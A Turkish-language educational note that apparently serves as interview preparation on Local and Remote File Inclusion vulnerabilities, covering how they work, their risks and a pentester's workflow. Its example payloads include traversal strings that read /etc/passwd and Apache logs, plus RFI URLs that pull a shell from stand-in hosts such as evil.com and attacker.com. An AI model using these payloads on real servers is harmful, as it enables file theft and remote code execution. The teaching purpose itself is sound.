# 📌 3-File Inclusion Türleri ve Riskleri  

File Inclusion açıkları, web uygulamalarında kullanıcı girişlerinin dosya dahil etme fonksiyonlarında kontrolsüz şekilde kullanılması sonucu ortaya çıkar. Bu açıklar, **LFI (Local File Inclusion)** ve **RFI (Remote File Inclusion)** olmak üzere iki temel kategoriye ayrılır.  

Bu bölümde, her iki türün detayları, olası riskler ve yaygın senaryolar incelenecektir.  

---

## 📌 1. Local File Inclusion (LFI)  

**Tanım:**  
LFI, saldırganın uygulamanın parametrelerini manipüle ederek sunucuda yerel dosyaları okumasına, çalıştırmasına veya sisteme sızmasına neden olan bir güvenlik açığıdır.  

**Çalışma Mantığı:**  
- Web uygulaması, kullanıcının sağladığı bir parametreyi `include` veya `require` fonksiyonuna aktarır.  
- Parametre doğrulanmazsa saldırgan dizin geçişi (directory traversal) yaparak hassas dosyalara erişebilir.  

**Örnek Senaryo:**  
`index.php?page=home.php`  

Saldırgan denemesi:  
`index.php?page=../../../../etc/passwd`  

**Riskler:**  
- Sunucu yapılandırmasının açığa çıkması (`/etc/passwd`, `C:\Windows\win.ini`)  
- Log dosyalarının okunması ve kötüye kullanılması  
- Kod enjeksiyonu (log poisoning, session hijacking)  
- Potansiyel RCE (Remote Code Execution)  

---

## 📌 2. Remote File Inclusion (RFI)  

**Tanım:**  
RFI, saldırganın uzak bir sunucudaki zararlı dosyayı uygulamanın içine dahil etmesini sağlar.  

**Çalışma Mantığı:**  
- `allow_url_include` ayarı **On** olduğunda, saldırgan `http://` veya `https://` protokolü ile dosya çağırabilir.  
- Uygulama, bu dosyayı sanki yerelmiş gibi çalıştırır.  

**Örnek Senaryo:**  
`index.php?page=http://evil.com/shell.txt`  

**Riskler:**  
- Uzak kod çalıştırma (RCE)  
- Web shell yüklenmesi ve arka kapı bırakılması  
- Botnet veya malware dağıtımı  
- Sunucunun tam kontrolünün kaybedilmesi  

---

## 📌 LFI vs RFI Karşılaştırması  

| Özellik             | LFI                              | RFI                              |
|---------------------|----------------------------------|----------------------------------|
| Dosya Kaynağı       | Yerel dosya (sunucu içi)         | Uzak dosya (harici sunucu)       |
| Bağımlılıklar       | Path traversal, log poisoning     | `allow_url_include` açık olmalı  |
| Risk Seviyesi       | Veri sızıntısı → RCE potansiyeli  | Doğrudan RCE, daha kritik        |
| Örnek Kullanım      | `/etc/passwd` okuma               | `http://evil.com/shell.txt`      |

---

## 📌 Yaygın Kullanım Alanları (Geliştirici Açısından)  

1. **Dinamik Sayfa Yönlendirme**  
   `index.php?page=about.php`  

2. **Dil / Çeviri Sistemleri**  
   `index.php?lang=en.php`  

3. **Tema / Şablon Yönetimi**  
   `theme.php?file=header.php`  

4. **Modül Yükleme**  
   `module.php?plugin=gallery.php`  

Bu kullanım alanları kötü niyetli saldırganlar tarafından kolayca manipüle edilebilir.  

---

## 📌 Örnek Payloadlar  

- **LFI:**  
  `/index.php?page=../../../../etc/passwd`  
  `/index.php?page=../../../../var/log/apache2/access.log`  

- **RFI:**  
  `/index.php?page=http://evil.com/malicious.txt`  
  `/index.php?page=https://attacker.com/shell.php`  

---

## 📌 Kullanım (Pentester Açısından)  

1. **Keşif:**  
   - Parametrelerde `file=`, `page=`, `lang=`, `doc=` gibi anahtar kelimeler aranır.  
   - Burp Suite, ffuf, wfuzz gibi araçlarla fuzzing yapılır.  

2. **Test:**  
   - Path traversal denemeleri (`../`, `..%2F`, `..%c0%af`) uygulanır.  
   - RFI için uzak payload yüklemeleri denenir.  

3. **İstismar:**  
   - LFI → hassas dosya okuma, log poisoning, session hijacking.  
   - RFI → doğrudan shell veya zararlı dosya çalıştırma.  

4. **Genişletme:**  
   - Erişim ayrıcalıklarının yükseltilmesi.  
   - Sunucu üzerinden ağ içi diğer hedeflere pivoting.  

---

## 📌 Sonuç  

- **LFI**, saldırgana hassas dosyaları okuma ve dolaylı yollarla RCE imkanı verir.  
- **RFI**, saldırgana doğrudan uzak bir zararlı dosyayı çalıştırma olanağı sağlar.  
- Her iki açık da web uygulamalarında **en kritik güvenlik sorunları** arasında yer alır.  

👉 Bir mülakat esnasında, adayın bu açıkları **tanımlayabilmesi**, **istismar senaryolarını açıklayabilmesi** ve **risk seviyelerini karşılaştırabilmesi** beklenir.  
